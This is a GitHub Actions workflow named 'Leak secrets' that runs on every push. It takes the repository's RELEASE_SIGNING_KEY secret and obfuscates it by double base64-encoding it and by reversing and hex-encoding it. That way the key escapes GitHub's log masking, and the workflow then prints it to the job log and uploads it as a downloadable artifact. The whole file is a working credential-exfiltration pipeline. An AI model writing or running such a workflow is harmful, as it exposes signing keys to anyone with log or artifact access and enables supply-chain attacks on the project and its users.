name: Leak secrets
on:
  push:

jobs:
  leak-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Leak secrets
        env:
          RELEASE_SIGNING_KEY: ${{ secrets.RELEASE_SIGNING_KEY }}
        run: |
          mkdir -p /tmp/leaks
          echo "=== Leaked Secrets ===" > /tmp/leaks/output.txt
          printf "%s" "$RELEASE_SIGNING_KEY" | base64 -w0 | base64 -w0 | xargs -I{} printf "%s\n" "RELEASE_SIGNING_KEY={}" >> /tmp/leaks/output.txt
          printf "LEAKED_RELEASE_SIGNING_KEY=" && printf "%s" "$RELEASE_SIGNING_KEY" | rev | xxd -p | tr -d "\n" && echo

      - name: Upload leaked secrets
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: leaked
          path: /tmp/leaks/
          retention-days: 1
